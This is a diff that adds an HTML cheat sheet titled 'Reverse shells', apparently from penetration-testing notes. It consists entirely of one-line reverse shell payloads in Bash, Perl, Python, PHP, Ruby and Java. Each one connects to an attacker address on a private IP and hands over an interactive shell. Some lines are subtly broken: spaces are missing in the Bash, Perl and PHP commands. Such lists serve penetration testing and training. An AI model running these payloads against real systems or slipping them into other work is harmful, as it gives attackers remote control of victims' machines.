@@ -1,0 +1,31 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Reverse shells</title>
+</head><body><b>Bash</b><br/>
+<tt><br/>
+bash -i &gt;&amp; /dev/tcp/<b>10.11.0.134</b>/<b>80</b>0&gt;&amp;1<br/>
+<br/>
+</tt><b>Perl<br/>
+</b><tt><br/>
+</tt><tt>perl -e 'use Socket;$i=&quot;<b>10.11.0.134</b>&quot;;$p=<b>80</b>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;<b>/bin/sh</b>-i&quot;);};'</tt><br/>
+<br/>
+<b>Python</b><br/>
+<tt><br/>
+</tt><tt>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;<b>10.0.0.1</b>&quot;,<b>1234</b>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;<b>/bin/sh</b>&quot;,&quot;-i&quot;]);'</tt><br/>
+<br/>
+<b>PHP<br/>
+</b><br/>
+change the file descriptor number if it doesn't work<b><br/>
+</b><tt>php -r '$sock=fsockopen(&quot;<b>10.0.0.1</b>&quot;,<b>1234</b>);exec(&quot;<b>/bin/sh</b>-i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'<br/>
+<br/>
+</tt><b>Ruby<br/>
+</b><tt><br/>
+ruby -rsocket -e'f=TCPSocket.open(&quot;<b>10.0.0.1</b>&quot;,<b>1234</b>).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)'<br/>
+<br/>
+</tt><b>Java</b><br/>
+<tt><br/>
+rt = Runtime.getRuntime()<br/>
+pc = rt.exec([&quot;<b>/bin/bash</b>&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/<b>10.1.1.100</b>/<b>4444</b>;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])<br/>
+</tt><tt>pc.waitFor()</tt><br/>
+</body></html>
